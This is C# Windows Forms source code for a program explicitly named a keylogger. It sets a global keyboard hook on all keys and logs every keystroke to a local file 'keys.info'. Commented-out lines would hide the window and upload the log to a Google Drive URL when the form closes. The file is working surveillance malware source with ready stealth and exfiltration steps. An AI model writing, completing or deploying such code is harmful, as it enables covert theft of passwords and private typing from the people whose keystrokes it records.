using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        GlobalKeyboardHook gHook;
        WebClient web;
        FileStream fs;
        StreamWriter wr;
        string tmp;
        public Form1()
        {
            InitializeComponent();
            label1.Text = "";
            //web = new WebClient();
            //tmp = "https://googledrive.com/host/0B-QP4eT8oLdsMmQwQVBZZ014Umc/";
            fs = File.Open("keys.info", FileMode.OpenOrCreate, FileAccess.Write);
            wr = new StreamWriter(fs);
            //wr.WriteLine("Dmt");
          
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
            gHook = new GlobalKeyboardHook();
            gHook.KeyDown += new KeyEventHandler(gHook_Keydown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
            gHook.hook();
            //BeginInvoke(new MethodInvoker(delegate { Hide(); }));
        }
        public void gHook_Keydown(object Sender, KeyEventArgs e)
        {
            label1.Text += ((char)e.KeyValue).ToString();
            wr.Write((char)e.KeyValue);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            gHook.unhook();
            wr.Close();
            fs.Close();
            //fs.Close();
           // web.UploadFileAsync(new Uri(tmp.Trim()), "keys.info");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            gHook.hook();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            gHook.unhook();
            wr.Close();
            fs.Close();
           // fs.Close();
            //web.UploadFileAsync(new Uri(tmp.Trim()), "keys.info");
        }
    }
}
